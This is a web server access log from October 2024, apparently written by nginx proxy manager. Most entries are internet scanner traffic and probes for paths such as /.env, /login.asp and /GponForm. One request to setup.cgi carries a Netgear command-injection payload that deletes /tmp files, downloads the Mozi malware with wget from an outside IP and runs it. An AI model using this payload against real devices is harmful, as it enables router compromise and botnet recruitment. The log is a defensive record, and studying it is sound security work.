[05/Oct/2024:18:46:03 +0000] 200 - GET http 20.81.47.192 "/" [Client 149.50.103.48] [Length 1033] [Gzip -] "-" "-"
[05/Oct/2024:19:13:08 +0000] 200 - GET http 20.81.47.192 "/" [Client 149.50.103.48] [Length 1033] [Gzip -] "-" "-"
[05/Oct/2024:19:23:01 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 80.82.77.202] [Length 154] [Gzip -] "-" "-"
[05/Oct/2024:19:50:04 +0000] 200 - GET http 20.81.47.192 "/" [Client 141.98.11.90] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[05/Oct/2024:19:57:07 +0000] 200 - GET http 20.81.47.192 "/" [Client 185.191.126.213] [Length 1033] [Gzip -] "-" "-"
[05/Oct/2024:20:04:48 +0000] 200 - GET http 20.81.47.192 "/" [Client 47.89.193.239] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
[05/Oct/2024:20:07:26 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 203.55.131.3] [Length 154] [Gzip -] "-" "-"
[05/Oct/2024:20:19:09 +0000] 200 - GET http 20.81.47.192 "/" [Client 141.98.11.15] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[05/Oct/2024:20:19:30 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 5.8.11.202] [Length 154] [Gzip -] "-" "-"
[05/Oct/2024:20:23:52 +0000] 200 - GET http 20.81.47.192 "/" [Client 203.55.131.3] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" "-"
[05/Oct/2024:20:32:54 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 93.174.93.12] [Length 154] [Gzip -] "-" "-"
[05/Oct/2024:20:53:42 +0000] 400 - GET http 20.81.47.192 "/" [Client 167.94.146.53] [Length 252] [Gzip -] "-" "-"
[05/Oct/2024:20:53:47 +0000] 400 - GET http 20.81.47.192 "/" [Client 167.94.146.53] [Length 252] [Gzip -] "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
[05/Oct/2024:20:53:48 +0000] 400 - - http localhost "-" [Client 167.94.146.53] [Length 154] [Gzip -] "-" "-"
[05/Oct/2024:21:06:39 +0000] 200 - GET http 20.81.47.192 "/" [Client 45.83.65.137] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" "-"
[05/Oct/2024:21:08:03 +0000] 200 - GET http 20.81.47.192 "/" [Client 141.98.11.79] [Length 1033] [Gzip -] "-" "-"
[05/Oct/2024:21:09:13 +0000] 200 - GET http 20.81.47.192 "/" [Client 95.214.55.138] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[05/Oct/2024:21:13:36 +0000] 200 - GET http 20.81.47.192 "/" [Client 95.214.27.33] [Length 568] [Gzip 1.86] "Linux Gnu (cow)" "-"
[05/Oct/2024:21:35:19 +0000] 200 - GET http 20.81.47.192 "/" [Client 149.50.103.48] [Length 1033] [Gzip -] "-" "-"
[05/Oct/2024:22:26:21 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 205.210.31.33] [Length 1033] [Gzip -] "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
[05/Oct/2024:22:46:53 +0000] 200 - GET http 20.81.47.192 "/" [Client 178.211.139.188] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[05/Oct/2024:22:55:29 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 93.174.93.12] [Length 1033] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" "-"
[05/Oct/2024:23:02:02 +0000] 200 - GET http 20.81.47.192 "/" [Client 141.98.11.15] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[05/Oct/2024:23:04:19 +0000] 200 - GET http 20.81.47.192 "/" [Client 141.98.11.79] [Length 1033] [Gzip -] "-" "-"
[05/Oct/2024:23:29:08 +0000] 400 - GET http 20.81.47.192 "/" [Client 165.154.40.10] [Length 252] [Gzip -] "curl/7.29.0" "-"
[05/Oct/2024:23:29:09 +0000] 400 - - http localhost "-" [Client 165.154.40.10] [Length 154] [Gzip -] "-" "-"
[05/Oct/2024:23:31:08 +0000] 400 - GET http 20.81.47.192 "/" [Client 165.154.120.253] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 8_2_2; Win64; x64) AppleWebKit/598.47 (KHTML, like Gecko) Chrome/54.0.1670 Safari/537.36" "-"
[05/Oct/2024:23:31:09 +0000] 400 - GET http 20.81.47.192 "/favicon.ico" [Client 165.154.120.253] [Length 252] [Gzip -] "Go-http-client/1.1" "-"
[05/Oct/2024:23:31:09 +0000] 400 - GET http 20.81.47.192 "/robots.txt" [Client 165.154.120.253] [Length 252] [Gzip -] "Go-http-client/1.1" "-"
[05/Oct/2024:23:31:09 +0000] 400 - GET http 20.81.47.192 "/sitemap.xml" [Client 165.154.120.253] [Length 252] [Gzip -] "Go-http-client/1.1" "-"
[05/Oct/2024:23:57:43 +0000] 404 - GET http 20.81.47.192 "/.env" [Client 178.215.236.240] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1" "-"
[06/Oct/2024:00:04:16 +0000] 200 - GET http 20.81.47.192 "/" [Client 93.182.35.74] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
[06/Oct/2024:00:11:44 +0000] 200 - GET http 20.81.47.192 "/" [Client 149.50.103.48] [Length 1033] [Gzip -] "-" "-"
[06/Oct/2024:00:35:39 +0000] 404 - GET http 20.81.47.192 "/login.asp" [Client 193.34.214.123] [Length 150] [Gzip -] "-" "-"
[06/Oct/2024:01:01:42 +0000] 400 - - http localhost "-" [Client 162.216.149.189] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:01:42 +0000] 400 - - http localhost "-" [Client 162.216.149.189] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:01:42 +0000] 400 - - http localhost "-" [Client 162.216.149.189] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:01:42 +0000] 400 - - http localhost "-" [Client 162.216.149.189] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:01:42 +0000] 400 - - http localhost "-" [Client 162.216.149.189] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:01:42 +0000] 400 - - http localhost "-" [Client 162.216.149.189] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:18:07 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 5.8.11.202] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 OPR/62.0.3331.116" "-"
[06/Oct/2024:01:18:21 +0000] 404 - GET http 20.81.47.192 "/login.asp" [Client 193.34.214.123] [Length 150] [Gzip -] "-" "-"
[06/Oct/2024:01:19:15 +0000] 200 - GET http 20.81.47.192 "/" [Client 185.16.39.118] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[06/Oct/2024:01:24:58 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 147.185.132.90] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:24:58 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 147.185.132.90] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:01:30:06 +0000] 404 - GET http 20.81.47.192 "/.env" [Client 87.120.115.119] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36" "-"
[06/Oct/2024:01:39:17 +0000] 200 - GET http 127.0.0.1 "/" [Client 116.49.33.7] [Length 1033] [Gzip -] "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
[06/Oct/2024:02:06:52 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 199.45.155.70] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:02:06:56 +0000] 200 - GET http localhost "/" [Client 185.224.128.47] [Length 1033] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
[06/Oct/2024:02:18:04 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 147.185.132.219] [Length 1033] [Gzip -] "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
[06/Oct/2024:02:33:06 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 167.94.146.48] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:03:05:10 +0000] 400 - GET http 20.81.47.192 "/" [Client 199.45.155.64] [Length 252] [Gzip -] "-" "-"
[06/Oct/2024:03:05:14 +0000] 400 - GET http 20.81.47.192 "/" [Client 199.45.155.64] [Length 252] [Gzip -] "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
[06/Oct/2024:03:05:15 +0000] 400 - - http localhost "-" [Client 199.45.155.64] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:03:36:52 +0000] 400 - - http localhost "-" [Client 172.214.115.102] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:03:48:41 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 179.43.133.162] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:04:09:13 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 5.8.11.202] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:04:42:40 +0000] 400 - GET http 20.81.47.192 "/" [Client 172.169.6.164] [Length 252] [Gzip -] "Mozilla/5.0 zgrab/0.x" "-"
[06/Oct/2024:04:50:01 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 205.210.31.140] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:04:50:01 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 205.210.31.140] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:04:53:20 +0000] 400 - GET http 20.81.47.192 "/" [Client 185.12.59.118] [Length 252] [Gzip -] "-" "-"
[06/Oct/2024:05:30:12 +0000] 404 - GET http localhost-nginx-proxy-manager "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.209.0.85:48664/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1" [Client 117.209.0.85] [Length 150] [Gzip -] "-" "-"
[06/Oct/2024:06:17:36 +0000] 200 - GET http www.thomasgroupusa.com "/" [Client 43.135.133.194] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[06/Oct/2024:06:42:49 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 93.174.93.12] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1" "-"
[06/Oct/2024:06:52:22 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 172.105.128.11] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:07:22:28 +0000] 400 - - http localhost "-" [Client 80.82.65.14] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:07:43:40 +0000] 200 - GET http localhost "/" [Client 185.224.128.47] [Length 1033] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
[06/Oct/2024:08:15:57 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 66.240.205.34] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:25:03 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 167.94.145.101] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:40:45 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 195.170.172.128] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:40:46 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 195.170.172.128] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:40:47 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 195.170.172.128] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:40:48 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 195.170.172.128] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:40:50 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 195.170.172.128] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:08:44:28 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 195.170.172.128] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:09:03:04 +0000] 400 - GET http 20.81.47.192 "/" [Client 167.94.145.103] [Length 252] [Gzip -] "-" "-"
[06/Oct/2024:09:03:08 +0000] 400 - GET http 20.81.47.192 "/" [Client 167.94.145.103] [Length 252] [Gzip -] "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
[06/Oct/2024:09:03:09 +0000] 400 - - http localhost "-" [Client 167.94.145.103] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:09:07:37 +0000] 404 - POST http 127.0.0.1 "/GponForm/diag_Form?images/" [Client 158.255.83.184] [Length 122] [Gzip 1.35] "Hello, World" "-"
[06/Oct/2024:09:07:38 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 158.255.83.184] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:10:51:59 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 46.174.191.32] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko" "-"
[06/Oct/2024:11:20:02 +0000] 404 - GET http www.thomasgroupusa.com "/robots.txt" [Client 195.191.219.133] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "-"
[06/Oct/2024:11:20:04 +0000] 200 - GET http www.thomasgroupusa.com "/" [Client 195.191.219.133] [Length 568] [Gzip 1.86] "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "-"
[06/Oct/2024:11:30:56 +0000] 200 - GET http www.thomasgroupusa.com "/" [Client 106.75.132.125] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" "-"
[06/Oct/2024:12:50:34 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 80.82.77.202] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:13:59:48 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 64.62.156.107] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:14:25:51 +0000] 400 - - http localhost "-" [Client 172.168.40.246] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:15:36:26 +0000] 200 - GET http www.thomasgroupusa.com "/" [Client 35.230.12.92] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
[06/Oct/2024:15:50:54 +0000] 200 - GET http localhost "/" [Client 185.224.128.47] [Length 1033] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
[06/Oct/2024:15:50:55 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 93.174.93.12] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:16:03:35 +0000] 400 - GET http 20.81.47.192 "/" [Client 71.6.134.231] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" "-"
[06/Oct/2024:17:11:43 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 179.43.133.162] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:17:38:59 +0000] 400 - GET http 20.81.47.192 "/" [Client 45.83.64.45] [Length 252] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" "-"
[06/Oct/2024:17:38:59 +0000] 400 - GET http 20.81.47.192 "/favicon.ico" [Client 45.83.66.116] [Length 252] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" "-"
[06/Oct/2024:18:08:54 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 198.235.24.170] [Length 1033] [Gzip -] "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
[06/Oct/2024:18:23:28 +0000] 400 - - http localhost "-" [Client 35.203.210.41] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:23:29 +0000] 400 - - http localhost "-" [Client 35.203.210.41] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:23:29 +0000] 400 - - http localhost "-" [Client 35.203.210.41] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:23:29 +0000] 400 - - http localhost "-" [Client 35.203.210.41] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:23:29 +0000] 400 - - http localhost "-" [Client 35.203.210.41] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:23:29 +0000] 400 - - http localhost "-" [Client 35.203.210.41] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:37:38 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 5.8.11.202] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:18:55:04 +0000] 400 - GET http speed.cloudflare.com "/cdn-cgi/trace" [Client 152.42.214.50] [Length 252] [Gzip -] "Mozilla/5.0" "-"
[06/Oct/2024:18:55:05 +0000] 404 - GET http speed.cloudflare.com "/cdn-cgi/trace" [Client 152.42.214.50] [Length 122] [Gzip 1.35] "Mozilla/5.0" "-"
[06/Oct/2024:18:55:11 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 152.42.214.50] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:19:22:57 +0000] 400 - GET http 20.81.47.192 "/" [Client 152.32.181.210] [Length 654] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" "-"
[06/Oct/2024:19:22:57 +0000] 400 - GET http 20.81.47.192 "/favicon.ico" [Client 152.32.181.210] [Length 654] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
[06/Oct/2024:19:22:58 +0000] 400 - GET http 20.81.47.192 "/robots.txt" [Client 152.32.181.210] [Length 654] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
[06/Oct/2024:19:22:58 +0000] 400 - GET http 20.81.47.192 "/sitemap.xml" [Client 152.32.181.210] [Length 654] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
[06/Oct/2024:19:23:36 +0000] 200 - GET http www.thomasgroupusa.com "/" [Client 43.157.22.57] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[06/Oct/2024:20:30:36 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 91.238.181.24] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:20:48:22 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 80.82.77.202] [Length 1033] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" "-"
[06/Oct/2024:21:12:49 +0000] 200 - GET http localhost "/" [Client 185.224.128.47] [Length 1033] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
[06/Oct/2024:21:14:08 +0000] 400 - - http localhost "-" [Client 147.45.112.147] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:21:17:30 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 5.8.11.202] [Length 1033] [Gzip -] "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36" "-"
[06/Oct/2024:21:19:02 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 13.40.47.146] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:21:36:05 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 66.240.205.34] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:21:53:42 +0000] 200 - GET http localhost-nginx-proxy-manager "/" [Client 104.214.106.52] [Length 1033] [Gzip -] "-" "-"
[06/Oct/2024:22:10:59 +0000] 400 - - http localhost "-" [Client 185.91.69.110] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:11:00 +0000] 400 - - http localhost "-" [Client 185.91.69.110] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:11:02 +0000] 400 - - http localhost "-" [Client 185.91.69.110] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:11:03 +0000] 400 - - http localhost "-" [Client 185.91.69.110] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:11:03 +0000] 400 - GET http 20.81.47.192 "/" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:04 +0000] 400 - POST http 20.81.47.192 "/" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:05 +0000] 400 - POST http 20.81.47.192 "/" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:06 +0000] 400 - GET http 20.81.47.192 "/WuEL" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)" "-"
[06/Oct/2024:22:11:08 +0000] 400 - - http localhost "-" [Client 185.91.69.110] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:11:09 +0000] 400 - GET http 20.81.47.192 "/a" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:10 +0000] 400 - GET http 20.81.47.192 "/download/file.ext" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:11 +0000] 400 - GET http 20.81.47.192 "/SiteLoader" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:13 +0000] 400 - GET http 20.81.47.192 "/mPlayer" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:11:21 +0000] 400 - POST http 20.81.47.192 "/" [Client 185.91.69.110] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
[06/Oct/2024:22:30:58 +0000] 400 - - http localhost "-" [Client 106.75.31.125] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:37:58 +0000] 400 - GET http 20.81.47.192 "/" [Client 106.75.164.149] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" "-"
[06/Oct/2024:22:38:23 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 66.240.205.34] [Length 154] [Gzip -] "-" "-"
[06/Oct/2024:22:39:17 +0000] 400 - GET http 20.81.47.192 "/" [Client 106.75.154.180] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" "-"
[06/Oct/2024:22:39:36 +0000] 400 - GET http 20.81.47.192 "/" [Client 106.75.175.130] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" "-"
